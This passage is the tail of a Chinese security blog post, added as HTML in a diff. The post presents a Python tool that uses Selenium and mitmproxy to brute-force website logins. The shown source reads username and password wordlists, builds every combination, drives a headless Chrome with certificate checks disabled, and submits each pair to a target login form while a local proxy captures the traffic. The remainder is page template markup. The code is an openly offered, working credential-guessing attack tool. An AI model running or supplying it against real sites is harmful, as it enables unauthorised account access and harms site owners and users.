+    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-ux'</span><span class="token punctuation">,</span> <span class="token string">'--username_xpath'</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'XPath expression for the username field.'</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-px'</span><span class="token punctuation">,</span> <span class="token string">'--password_xpath'</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'XPath expression for the password field.'</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-lx'</span><span class="token punctuation">,</span> <span class="token string">'--login_xpath'</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'XPath expression for the login button.'</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'-proxy'</span><span class="token punctuation">,</span> <span class="token string">'--proxy'</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'代理,例如http://127.0.0.1:8080'</span><span class="token punctuation">,</span> required<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token comment"># Global variables from command-line arguments</span>
+args <span class="token operator">=</span> parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>
+target <span class="token operator">=</span> args<span class="token punctuation">.</span>target
+username_p <span class="token operator">=</span> args<span class="token punctuation">.</span>usernames
+password_p <span class="token operator">=</span> args<span class="token punctuation">.</span>passwords
+username_xpath <span class="token operator">=</span> args<span class="token punctuation">.</span>username_xpath
+password_xpath <span class="token operator">=</span> args<span class="token punctuation">.</span>password_xpath
+login_xpath <span class="token operator">=</span> args<span class="token punctuation">.</span>login_xpath
+proxy <span class="token operator">=</span> args<span class="token punctuation">.</span>proxy
+
+<span class="token comment"># Function to read data from text files</span>
+<span class="token keyword">def</span> <span class="token function">get_data_from_txt</span><span class="token punctuation">(</span>username_file<span class="token punctuation">,</span> password_file<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>username_file<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> usernames<span class="token punctuation">,</span> <span class="token builtin">open</span><span class="token punctuation">(</span>password_file<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> passwords<span class="token punctuation">:</span>
+        username_data <span class="token operator">=</span> usernames<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        password_data <span class="token operator">=</span> passwords<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        data_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+        <span class="token keyword">for</span> username <span class="token keyword">in</span> username_data<span class="token punctuation">:</span>
+            <span class="token keyword">for</span> password <span class="token keyword">in</span> password_data<span class="token punctuation">:</span>
+                data_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">(</span>username<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> password<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+        <span class="token keyword">return</span> data_list
+
+<span class="token comment"># Test case class</span>
+<span class="token decorator annotation punctuation">@ddt</span>
+<span class="token keyword">class</span> <span class="token class-name">Scan</span><span class="token punctuation">(</span>unittest<span class="token punctuation">.</span>TestCase<span class="token punctuation">)</span><span class="token punctuation">:</span>
+
+    <span class="token decorator annotation punctuation">@classmethod</span>
+    <span class="token keyword">def</span> <span class="token function">setUpClass</span><span class="token punctuation">(</span>cls<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        
+        service <span class="token operator">=</span> Service<span class="token punctuation">(</span><span class="token string">'chrome/chromedriver/chromedriver'</span><span class="token punctuation">)</span>
+        chrome_executable_path <span class="token operator">=</span> <span class="token string">'chrome/Chrome.app/Contents/MacOS/Google Chrome'</span>
+        options <span class="token operator">=</span> webdriver<span class="token punctuation">.</span>ChromeOptions<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        options<span class="token punctuation">.</span>binary_location <span class="token operator">=</span> chrome_executable_path
+        options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--ignore-certificate-errors'</span><span class="token punctuation">)</span>
+        options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--ignore-ssl-errors'</span><span class="token punctuation">)</span>
+        options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--no-sandbox'</span><span class="token punctuation">)</span>
+        options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'--headless'</span><span class="token punctuation">)</span><span class="token comment">#隐藏页面</span>
+        options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">"--disable-extensions"</span><span class="token punctuation">)</span>
+        options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">"--allow-running-insecure-content"</span><span class="token punctuation">)</span>
+        options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">"--ignore-certificate-errors"</span><span class="token punctuation">)</span>
+        options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">"--disable-single-click-autofill"</span><span class="token punctuation">)</span>
+        options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">"--disable-autofill-keyboard-accessory-view[8]"</span><span class="token punctuation">)</span>
+        options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">"--disable-full-form-autofill-ios"</span><span class="token punctuation">)</span>
+        options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">'user-agent=Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:55.0) Gecko/20100101 Firefox/55.0'</span><span class="token punctuation">)</span>
+
+
+        <span class="token keyword">if</span> proxy <span class="token operator">!=</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+            options<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'--proxy-server=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>proxy<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>
+        
+        cls<span class="token punctuation">.</span>driver <span class="token operator">=</span> webdriver<span class="token punctuation">.</span>Chrome<span class="token punctuation">(</span>service<span class="token operator">=</span>service<span class="token punctuation">,</span> options<span class="token operator">=</span>options<span class="token punctuation">)</span>
+        cls<span class="token punctuation">.</span>driver<span class="token punctuation">.</span>implicitly_wait<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>
+        cls<span class="token punctuation">.</span>driver<span class="token punctuation">.</span>get<span class="token punctuation">(</span>target<span class="token punctuation">)</span>
+
+    <span class="token keyword">def</span> <span class="token function">setUp</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        self<span class="token punctuation">.</span>driver<span class="token punctuation">.</span>get<span class="token punctuation">(</span>target<span class="token punctuation">)</span>
+        self<span class="token punctuation">.</span>username <span class="token operator">=</span> self<span class="token punctuation">.</span>driver<span class="token punctuation">.</span>find_element<span class="token punctuation">(</span>By<span class="token punctuation">.</span>XPATH<span class="token punctuation">,</span> username_xpath<span class="token punctuation">)</span>
+        self<span class="token punctuation">.</span>password <span class="token operator">=</span> self<span class="token punctuation">.</span>driver<span class="token punctuation">.</span>find_element<span class="token punctuation">(</span>By<span class="token punctuation">.</span>XPATH<span class="token punctuation">,</span> password_xpath<span class="token punctuation">)</span>
+        self<span class="token punctuation">.</span>login <span class="token operator">=</span> self<span class="token punctuation">.</span>driver<span class="token punctuation">.</span>find_element<span class="token punctuation">(</span>By<span class="token punctuation">.</span>XPATH<span class="token punctuation">,</span> login_xpath<span class="token punctuation">)</span>
+
+
+    <span class="token decorator annotation punctuation">@data</span><span class="token punctuation">(</span><span class="token operator">*</span>get_data_from_txt<span class="token punctuation">(</span>username_p<span class="token punctuation">,</span> password_p<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token decorator annotation punctuation">@unpack</span>
+    <span class="token keyword">def</span> <span class="token function">test_login</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> username<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        self<span class="token punctuation">.</span>username<span class="token punctuation">.</span>send_keys<span class="token punctuation">(</span>username<span class="token punctuation">)</span>
+        self<span class="token punctuation">.</span>password<span class="token punctuation">.</span>send_keys<span class="token punctuation">(</span>password<span class="token punctuation">)</span>
+
+
+        <span class="token comment"># 点击登录按钮</span>
+        <span class="token keyword">global</span> global_enable_logging 
+        global_enable_logging  <span class="token operator">=</span> <span class="token boolean">True</span>
+        self<span class="token punctuation">.</span>login<span class="token punctuation">.</span>click<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        global_enable_logging <span class="token operator">=</span> <span class="token boolean">False</span>
+        
+        
+    <span class="token keyword">def</span> <span class="token function">tearDown</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        
+        self<span class="token punctuation">.</span>username <span class="token operator">=</span> self<span class="token punctuation">.</span>driver<span class="token punctuation">.</span>find_element<span class="token punctuation">(</span>By<span class="token punctuation">.</span>XPATH<span class="token punctuation">,</span> username_xpath<span class="token punctuation">)</span>
+        self<span class="token punctuation">.</span>password <span class="token operator">=</span> self<span class="token punctuation">.</span>driver<span class="token punctuation">.</span>find_element<span class="token punctuation">(</span>By<span class="token punctuation">.</span>XPATH<span class="token punctuation">,</span> password_xpath<span class="token punctuation">)</span>
+        self<span class="token punctuation">.</span>login <span class="token operator">=</span> self<span class="token punctuation">.</span>driver<span class="token punctuation">.</span>find_element<span class="token punctuation">(</span>By<span class="token punctuation">.</span>XPATH<span class="token punctuation">,</span> login_xpath<span class="token punctuation">)</span>
+        self<span class="token punctuation">.</span>username<span class="token punctuation">.</span>clear<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        self<span class="token punctuation">.</span>password<span class="token punctuation">.</span>clear<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        
+
+    <span class="token decorator annotation punctuation">@classmethod</span>
+    <span class="token keyword">def</span> <span class="token function">tearDownClass</span><span class="token punctuation">(</span>cls<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token comment">#pass</span>
+        cls<span class="token punctuation">.</span>driver<span class="token punctuation">.</span>quit<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+    args <span class="token operator">=</span> parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    target <span class="token operator">=</span> args<span class="token punctuation">.</span>target
+    <span class="token comment"># ... other parameters setup ...</span>
+
+    <span class="token comment"># Start mitmproxy server in a separate thread</span>
+    proxy_thread <span class="token operator">=</span> start_proxy_thread<span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> <span class="token number">8081</span><span class="token punctuation">)</span>
+    <span class="token comment"># Wait for mitmproxy to be ready - you might want to implement a more robust check here</span>
+    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>  <span class="token comment"># Sleep for 5 seconds to ensure mitmproxy is up</span>
+
+    <span class="token comment"># Run Selenium tests</span>
+    sys<span class="token punctuation">.</span>argv <span class="token operator">=</span> <span class="token punctuation">[</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
+    unittest<span class="token punctuation">.</span>main<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+            <div class="post-tags">
+              <!-- 文章tags -->
+              
+                
+                  <cosy-label href="../../../../tags/selenium/" size="sm"># selenium</cosy-label>
+                  
+                  <cosy-label href="../../../../tags/mitmproxy/" size="sm"># mitmproxy</cosy-label>
+                  
+                  <cosy-label href="../../../../tags/python/" size="sm"># python</cosy-label>
+                  
+                  <cosy-label href="../../../../tags/Mac/" size="sm"># Mac</cosy-label>
+                  
+                  <cosy-label href="../../../../tags/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/" size="sm"># 密码爆破</cosy-label>
+                  
+                    
+            </div>
+            <p class="motto">RecoveryAshes Blog</p>
+        </article>
+        <!-- 评论 -->
+        <div id="vcomments"></div>
+        <div id="tcomment"></div>
+      </div>
+    </main>
+    <!-- toc -->
+    
+      <cosy-drag-box id="toc-drag-box" trigger="left" min-width="220" uid="toc-box">
+        <div class="meta-container">
+          <div class="toc-wrapper cosy-scrollbar">
+            <cosy-tooltip placement="right">
+              <p class="catalog">
+                <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 24 24">
+                  <g fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M4 6h16"></path>
+                    <path d="M4 12h16"></path>
+                    <path d="M4 18h12"></path>
+                  </g>
+                </svg>
+                <span>目录</span>
+              </p>
+              <span slot="content">
+                <span>隐藏目录</span>
+                <cosy-short-key>]</cosy-short-key>
+              </span>
+            </cosy-tooltip>
+            <!-- 文章toc -->
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#selenium-mitmproxy-python%E5%AE%9E%E7%8E%B0%E5%8A%A0%E5%AF%86%E7%88%86%E7%A0%B4%E8%B4%A6%E6%88%B7%E5%AF%86%E7%A0%81V1-0"><span class="toc-number">1.</span> <span class="toc-text">selenium+mitmproxy+python实现加密爆破账户密码V1.0</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">1.1.</span> <span class="toc-text">使用方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E7%A0%81"><span class="toc-number">1.2.</span> <span class="toc-text">源码</span></a></li></ol></li></ol>
+          </div>
+        </div>
+      </cosy-drag-box>
+      
+  </div>
+
+</div>
+
+<script>
+  window.page = {
+    use: 'twikoo'
+  }
+  window.katex = {
+    enable: "",
+    jsCdn: "//cdn.jsdelivr.net/npm/katex@0.13.18/dist/katex.min.js",
+    cssCdn: "//cdn.jsdelivr.net/npm/katex@0.13.18/dist/katex.min.css"
+  }
+  window.mermaid = {
+    enable: "",
+    theme: "",
+    cdn: "//cdn.jsdelivr.net/npm/mermaid@10.4.0/dist/mermaid.min.js",
+  }
+  window.valine = {
+    enable: "",
+    appId: 'yourValineAppId',
+    appKey: 'yourValineAppKey',
+    avatar: 'monsterid',
+    cdn: '//unpkg.com/valine@latest/dist/Valine.min.js',
+    serverURLs: ''
+  };
+  window.twikoo = {
+    enable: "",
+    envId: "https://twikoo-cloudflare.lehaoxu.workers.dev",
+    cdn: 'https://cdn.staticfile.org/twikoo/1.6.32/twikoo.all.min.js',
+    lang: 'zh-CN',
+  }
+</script>
+
+
+<script src="../../../../js/8f5fa89f.js"></script>
+
+  </main>
+</body>
+
+<script>
+  window.theme = {
+    color: 'hsl(238,50%,56%)'
+  }
+</script>
+
+
+<script src="../../../../js/e5a59732.js"></script>
+
+
+</html>
